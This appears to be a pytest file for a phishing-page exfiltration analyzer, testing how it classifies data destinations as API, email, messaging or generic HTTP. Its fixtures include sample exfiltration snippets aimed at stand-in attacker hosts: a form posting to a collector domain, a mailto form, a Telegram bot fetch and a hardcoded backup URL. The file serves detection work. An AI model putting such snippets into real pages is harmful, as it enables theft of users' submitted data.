"""Testes do analisador de exfiltracao (analyzers.exfiltration_analyzer)."""

from __future__ import annotations

from analyzers.dom_analyzer import analyze_dom
from analyzers.exfiltration_analyzer import analyze_exfiltration
from analyzers.javascript_analyzer import analyze_javascript
from models.findings import ExfiltrationChannel


def test_identifies_form_post_destination_as_api(sample_html: str, sample_js: str) -> None:
    dom = analyze_dom(sample_html)
    js = analyze_javascript(sample_js)
    report = analyze_exfiltration(dom, js)

    urls = {d.url for d in report.destinations}
    assert "https://collector.evil-domain.test/api/collect" in urls
    matching = next(d for d in report.destinations if d.url == "https://collector.evil-domain.test/api/collect")
    assert matching.channel == ExfiltrationChannel.API
    assert matching.confidence >= 0.85


def test_classifies_email_destination() -> None:
    dom = analyze_dom('<form action="mailto:attacker@evil.test" method="POST"></form>')
    js = analyze_javascript("")
    report = analyze_exfiltration(dom, js)
    assert len(report.destinations) == 1
    assert report.destinations[0].channel == ExfiltrationChannel.EMAIL


def test_classifies_messaging_destination() -> None:
    js = analyze_javascript('fetch("https://api.telegram.org/bot123/sendMessage");')
    dom = analyze_dom("<html></html>")
    report = analyze_exfiltration(dom, js)
    assert any(d.channel == ExfiltrationChannel.MESSAGING for d in report.destinations)


def test_classifies_generic_http_destination() -> None:
    dom = analyze_dom('<form action="https://plain-server.test/save" method="POST"></form>')
    js = analyze_javascript("")
    report = analyze_exfiltration(dom, js)
    assert report.destinations[0].channel == ExfiltrationChannel.HTTP


def test_hardcoded_url_gets_lower_confidence() -> None:
    dom = analyze_dom("<html></html>")
    js = analyze_javascript('var backup = "https://backup-exfil.test/api/store";')
    report = analyze_exfiltration(dom, js)
    assert report.destinations[0].confidence == 0.4


def test_no_destinations_yields_zero_overall_confidence() -> None:
    dom = analyze_dom("<html><body>Nada aqui</body></html>")
    js = analyze_javascript("")
    report = analyze_exfiltration(dom, js)
    assert report.destinations == []
    assert report.overall_confidence == 0.0
